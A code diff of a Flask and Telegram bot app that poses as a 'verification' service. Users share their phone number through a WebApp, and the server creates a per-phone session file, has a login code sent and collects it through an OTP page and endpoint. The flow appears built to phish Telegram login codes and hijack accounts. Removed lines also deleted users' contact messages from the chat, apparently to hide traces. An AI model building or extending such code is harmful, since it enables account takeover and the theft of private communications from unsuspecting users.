@@ -31,7 +31,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 sessions = {}
 session_expiry = 300  # 5 minutes
 telegram_clients = {}
-contact_messages = {}  # Store message IDs for deletion
 
 # Create directories
 os.makedirs('sessions', exist_ok=True)
@@ -213,7 +212,6 @@ def init_session():
         first_name = data.get('first_name', '')
         last_name = data.get('last_name', '')
         chat_id = data.get('chat_id')
-        message_id = data.get('message_id')
         
         # Generate session ID for this WebApp instance
         session_id = generate_session_id()
@@ -225,7 +223,6 @@ def init_session():
             'first_name': first_name,
             'last_name': last_name,
             'chat_id': chat_id,
-            'message_id': message_id,
             'phone': None,
             'status': 'waiting_for_contact',
             'expiry': datetime.now() + timedelta(seconds=session_expiry),
@@ -243,53 +240,15 @@ def init_session():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-@app.route('/otp/<session_id>/<phone>')
-def otp_page(session_id, phone):
-    """OTP entry page - accessed after contact is shared"""
-    if session_id not in sessions:
-        return "Session expired. Please start over.", 400
-    
-    session = sessions[session_id]
-    if session['phone'] != phone:
-        return "Phone number mismatch.", 400
-    
-    return render_template('otp.html', session_id=session_id, phone=phone)
-
-@app.route('/success')
-def success_page():
-    """Success page"""
-    return render_template('success.html')
-
-@app.route('/api/get-session-info', methods=['POST'])
-def get_session_info():
-    """Get session info for WebApp"""
-    try:
-        data = request.json
-        session_id = data.get('session_id')
-        
-        if session_id not in sessions:
-            return jsonify({'success': False, 'error': 'Session expired or invalid'})
-        
-        session = sessions[session_id]
-        return jsonify({
-            'success': True,
-            'phone': session.get('phone', ''),
-            'first_name': session.get('first_name', ''),
-            'last_name': session.get('last_name', ''),
-            'status': session.get('status', '')
-        })
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/verify-contact', methods=['POST'])
-def verify_contact():
-    """Verify contact and send OTP - called from WebApp after contact is shared"""
+@app.route('/api/process-contact', methods=['POST'])
+def process_contact():
+    """Process contact shared via WebApp and send OTP"""
     try:
         data = request.json
         session_id = data.get('session_id')
         phone = data.get('phone', '').strip()
         
-        print(f"Verifying contact for session {session_id}: {phone}")
+        print(f"Processing contact for session {session_id}: {phone}")
         
         if session_id not in sessions:
             return jsonify({'success': False, 'error': 'Session expired. Please restart WebApp.'})
@@ -301,15 +260,6 @@ def verify_contact():
         # Validate phone number
         if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
             return jsonify({'success': False, 'error': 'Invalid phone number format'})
-        
-        # Delete the contact message from chat if exists
-        session = sessions[session_id]
-        if session.get('chat_id') and session.get('message_id'):
-            try:
-                bot.delete_message(session['chat_id'], session['message_id'])
-                print(f"Deleted contact message for user {session['user_id']}")
-            except Exception as e:
-                print(f"Could not delete message: {e}")
         
         # Generate session file
         session_file = generate_session_file(phone)
@@ -337,16 +287,33 @@ def verify_contact():
             
             return jsonify({
                 'success': True,
-                'message': 'OTP sent successfully',
-                'redirect_url': f'/otp/{session_id}/{phone}'
+                'phone': phone,
+                'message': 'OTP sent successfully'
             })
         else:
             print(f"Failed to send OTP to {phone}: {result.get('error')}")
             return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
             
     except Exception as e:
-        print(f"Error in verify-contact: {str(e)}")
+        print(f"Error in process-contact: {str(e)}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
+
+@app.route('/otp/<session_id>/<phone>')
+def otp_page(session_id, phone):
+    """OTP entry page - accessed after contact is shared"""
+    if session_id not in sessions:
+        return "Session expired. Please start over.", 400
+    
+    session = sessions[session_id]
+    if session['phone'] != phone:
+        return "Phone number mismatch.", 400
+    
+    return render_template('otp.html', session_id=session_id, phone=phone)
+
+@app.route('/success')
+def success_page():
+    """Success page"""
+    return render_template('success.html')
 
 @app.route('/api/verify-otp', methods=['POST'])
 def verify_otp():
@@ -531,25 +498,18 @@ ID: {user_id}
         keyboard.add(webapp_btn)
         
         # Send WebApp button
-        webapp_msg = bot.send_message(
+        bot.send_message(
             chat_id,
             "Click the button below to start verification:",
             reply_markup=keyboard
         )
-        
-        # Store message ID for potential deletion
-        contact_messages[user_id] = {
-            'chat_id': chat_id,
-            'verification_msg_id': verification_msg.message_id,
-            'webapp_msg_id': webapp_msg.message_id
-        }
         
         print(f"Verification started for user {user_id}")
         
     except Exception as e:
         print(f"Start command error: {e}")
 
-# Handler for contact sharing via chat (fallback)
+# Handler for contact sharing via chat (for testing/fallback)
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
     """Handle contact sharing via chat (fallback)"""
@@ -619,7 +579,7 @@ def webhook():
 
 # ==================== CLEANUP THREAD ====================
 def cleanup_loop():
-    """Clean up old sessions and messages"""
+    """Clean up old sessions"""
     while True:
         time.sleep(60)
         current_time = datetime.now()
